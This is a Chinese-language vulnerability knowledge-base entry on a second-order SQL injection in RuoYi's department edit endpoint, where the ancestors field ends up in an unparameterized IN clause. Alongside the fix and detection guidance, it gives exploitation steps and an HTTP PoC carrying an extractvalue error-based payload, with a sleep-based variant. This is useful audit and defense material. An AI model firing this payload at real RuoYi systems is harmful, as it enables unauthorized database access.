---
id: web-generic-sqli-ruoyi-dept-ancestors-second-order-in
title: RuoYi 部门编辑 ancestors 写入后拼进 IN (${ancestors})：同请求内二阶 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: ruoyi-dept-ancestors-second-order-in-injection
tags:
- java
- ruoyi
- sqli
- mybatis
- second-order
- in-clause
- dept
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: <= 4.6.1（原文漏洞对比表）；4.2.0 实测
verification:
  verified_by: verifier-V201
  verified_at: '2026-11-07T02:10:55+08:00'
  notes: 已对照原文与全部61张图核对；与web-generic-sqli-luckyframeweb-ancestors-in-clause同sink但产品/触发条件不同，按dedup_review并列保留；未复跑环境
url: /docs/web/generic/sqli/web-generic-sqli-ruoyi-dept-ancestors-second-order-in/
draft: false
kb_aliases:
- RuoYi ancestors 注入
- 若依部门编辑 SQL注入
- /system/dept/edit 注入
- updateDeptStatus 注入
- IN (${ancestors})
- 二阶 SQL 注入
---

## 一句话结论

RuoYi 的 `SysDept.ancestors` 是可由请求绑定的 String，`/system/dept/edit` 先用 `updateDept` 把它写进 `sys_dept`，再在 `status=0` 时调用 `updateParentDeptStatus` 按 deptId 重查该行（取到刚写入的恶意 ancestors），最终 `updateDeptStatus` 的 Mapper 用 `where dept_id in (${ancestors})` 文本拼接，形成同一请求内完成的二阶 SQL 注入。

## 原理

- **可控字段**：`SysDept` 继承 `BaseEntity`，`private String ancestors;`（祖级列表，逗号分隔的部门 ID 字符串）由 `@Validated SysDept dept` 从请求表单绑定，攻击者可控。
- **写入**：`SysDeptController.editSave` → `deptService.updateDept(dept)` → `deptMapper.updateDept(dept)` 把包括 `ancestors` 在内的字段持久化到 `sys_dept`（原文实测表明该列被更新）。
- **触发状态更新**：`updateDept` 在 `UserConstants.DEPT_NORMAL.equals(dept.getStatus())`（status=`"0"`）时调用 `updateParentDeptStatus(dept)`。
- **二阶读取**：`updateParentDeptStatus` 执行 `dept = deptMapper.selectDeptById(dept.getDeptId())`，从数据库重新读出刚刚写入的恶意 `ancestors`，再调用 `deptMapper.updateDeptStatus(dept)`。
- **注入点**：`SysDeptMapper.xml` 的 `updateDeptStatus` 末尾为 `where dept_id in (${ancestors})`；`${}` 是字符串替换，恶意内容进入 SQL 语法层，`#{}` 的预编译保护不存在。
- **为什么同一请求即可完成**：写入与读取发生在同一个 `updateDept` 调用里，不需要额外的查询请求；攻击者只需提交一次带 payload 的编辑请求，随后状态更新语句就把 payload 拼进 SQL。
- **修复**：官方把 `updateParentDeptStatus` 改为 `Convert.toLongArray(ancestors)` 转成 `Long[] deptIds`，新增 `updateDeptStatusNormal(Long[])`，Mapper 用 `<foreach collection="array" item="deptId" open="(" separator="," close=")">#{deptId}</foreach>` 预编译绑定。

## 触发条件

- RuoYi <= 4.6.1（原文对比表；4.2.0 实测），未应用数组化修复。
- 攻击者拥有 `system:dept:edit` 权限（默认 admin 或部门管理角色）。
- `status` 设为 `"0"`（DEPT_NORMAL），触发 `updateParentDeptStatus`。
- `updateDept` 的 Mapper 更新 `ancestors` 列（RuoYi 默认实现会更新；若目标做过字段裁剪需重新确认）。
- 数据库错误可回显（报错注入）或可时间盲注。

## 利用步骤

1. 登录具备部门编辑权限的账号，抓取 `/system/dept/edit` 请求。
2. 在请求体中设置 `DeptId`（已有部门 ID，或先新建）、`Status=0`、`ancestors` 为注入载荷，例如 `0)or(extractvalue(1,concat((select user()))));#`。
3. 发送请求；服务端先写入 `ancestors`，再重查并拼接进 `updateDeptStatus` 的 `IN (...)`。
4. 观察响应错误信息确认注入（XPATH syntax error），或改用 `sleep` 做时间盲注。
5. 按 MySQL 语法读取数据库名、表名与数据；注意 `IN (` 前缀与 `)`/`#` 的闭合。
6. 清理测试部门与写入的恶意记录。

## PoC

```http
POST /system/dept/edit HTTP/1.1
Host: target
Cookie: JSESSIONID=<admin 会话>
Content-Type: application/x-www-form-urlencoded

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```

```text
预期：updateDeptStatus 的 SQL 变为
  update sys_dept set status='0' ... where dept_id in (0)or(extractvalue(1,concat((select user()))));#)
报错回显当前数据库用户；也可把 extractvalue 换成 sleep(3) 做时间盲注。
```

## 变体与关联

- 变体：若 `updateDept` 不更新 `ancestors`，可先通过其它写入点持久化 payload，再触发一次 `status=0` 的更新，形成跨请求二阶注入。
- 变体：`ancestors` 可能出现在其它 `IN (${...})`、`find_in_set`、`like` 拼接处；全局搜索 `${ancestors}`。
- 变体：同产品 `updateDeptStatusNormal` 的数组化修复可被移植到其它同类 `IN` 拼接点。
- 关联：[[web-generic-sqli-luckyframeweb-ancestors-in-clause]]（同为 `IN (${ancestors})` 二阶注入，触发条件不同）、[[web-generic-sqli-ruoyi-datascope-params-admin-bypass]]（同产品 dataScope 注入）、[[web-generic-sqli-error-based-extraction]]（报错注入通用手法）。

## 检测与防御

- 修复：升级到使用 `updateDeptStatusNormal(Long[])` + `<foreach>` 预编译的版本；禁止 `${}` 拼接 `ancestors`。
- 修复：`ancestors` 应由服务端根据部门树维护，客户端提交值只做只读校验，不接受任意字符串。
- 加固：对部门编辑接口做参数白名单（`ancestors` 只允许数字与逗号）；关闭详细 SQL 错误回显；数据库账号最小权限。
- 检测：请求体 `ancestors` 含引号、括号、`extractvalue`/`updatexml`/`sleep`/`#` 等字符；`update sys_dept ... where dept_id in (` 语句出现非数字内容；500 错误中出现 XPATH/SQL 报错。
